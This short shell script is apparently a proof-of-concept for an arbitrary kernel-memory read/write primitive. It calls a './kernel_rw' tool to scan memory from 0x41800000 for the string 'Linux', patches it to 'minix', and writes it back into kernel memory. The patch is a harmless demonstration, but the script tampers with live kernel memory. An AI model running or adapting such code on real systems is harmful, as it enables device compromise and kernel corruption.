#!/bin/sh

# find linux
for i in `seq 0 0x400 0x5669b3`
do
    ./kernel_rw r $(printf '%x' "$(($i + 0x41800000))") "dump-$i" 400 &> /dev/null
    if grep -a -q Linux "dump-$i"; then
        echo "[+] Found Linux string at "0x$(printf '%x' "$(($i + 0x41800000))")
        break;
    else
        rm "dump-$i"
    fi
done

# look for more precise offset
rm "dump-$i"
for j in  `seq $i 0x10 $(($i + 0x400))`
do
    ./kernel_rw r $(printf '%x' "$(($j + 0x41800000))") "dump-$j" 16 &> /dev/null
    if grep -a -q Linux "dump-$j"; then
        echo "[+] Found Linux string at "0x$(printf '%x' "$(($j + 0x41800000))")
        break;
    else
        rm "dump-$j"
    fi
done

# replace Linux by minix
xxd -p dump-$j | sed 's/4c696e7578/6d696e6978/'  | xxd -r -p - > dump-$j-patched

# write it back
echo "[+] Write the patched value"
./kernel_rw w $(printf '%x' "$(($j + 1098907648))") dump-$j-patched &> /dev/null

rm "dump-$j" dump-$j-patched
